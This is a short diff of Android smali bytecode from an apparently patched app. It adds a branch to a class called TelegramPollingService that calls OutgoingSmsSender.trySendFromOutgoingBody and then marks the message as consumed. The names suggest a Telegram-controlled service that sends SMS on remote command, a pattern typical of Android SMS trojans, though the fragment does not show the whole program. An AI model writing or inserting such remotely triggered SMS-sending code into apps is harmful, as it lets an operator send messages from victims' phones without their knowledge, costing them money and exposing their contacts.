@@ -1168,6 +1168,19 @@
     move-result-object v5
 
     .line 371
+    invoke-static {p0, v4, v5}, Lcom/virtus/module/OutgoingSmsSender;->trySendFromOutgoingBody(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z
+
+    move-result v6
+
+    if-eqz v6, :cond_out_send
+
+    invoke-direct {p0, p1}, Lcom/virtus/module/TelegramPollingService;->markConsumed(Ljava/lang/String;)V
+
+    monitor-exit p0
+
+    return-void
+
+    :cond_out_send
     invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
 
     move-result v6
